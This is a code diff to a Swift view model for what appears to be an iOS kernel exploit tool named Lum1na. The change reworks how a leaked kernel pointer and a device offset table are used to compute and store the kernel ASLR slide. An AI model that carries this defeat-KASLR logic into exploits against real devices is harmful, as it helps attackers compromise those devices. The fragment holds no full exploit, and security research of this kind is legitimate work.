@@ -121,9 +121,11 @@ class Lum1naViewModel: ObservableObject {
         detectDevice()
         log("Lum1na initialized", level: .info)
         
-        // Log which offset table we're using
-        let tag = LabOffsetsBridge.shared.currentTag()
+        // FIXED: Use getDeviceOffsets() and .tag
+        let offsets = getDeviceOffsets()
+        let tag = String(cString: offsets.tag)
         log("Device profile: \(tag)", level: .info)
+        log("Static base: 0x\(String(offsets.static_base, radix: 16))", level: .info)
     }
     
     func detectDevice() {
@@ -377,13 +379,17 @@ class Lum1naViewModel: ObservableObject {
         
         guard leakedPtr != 0 else { return nil }
         
-        // Calculate slide using runtime kernel base
-        let kernelBase = LabOffsetsBridge.shared.loadOffsets()?.slidePage ?? 0xFFFFFFF007004000
+        // FIXED: Use getDeviceOffsets().static_base instead of .slidePage
+        let offsets = getDeviceOffsets()
+        let kernelBase = offsets.static_base  // CORRECT field name
         let slide = leakedPtr - kernelBase
         
         guard slide < 0x100000000 && (slide & 0x3FFF) == 0 else {
             return nil
         }
+        
+        // Store slide in runtime
+        LabSetKernSlide(slide)
         
         // cleanup
         let cleanupSel = NSSelectorFromString("cleanup")
@@ -412,6 +418,7 @@ class Lum1naViewModel: ObservableObject {
         exploitState = .idle
         clearConsole()
         currentKSlide = 0
+        LabSetKernSlide(0)
         log("State reset", level: .info)
     }
     
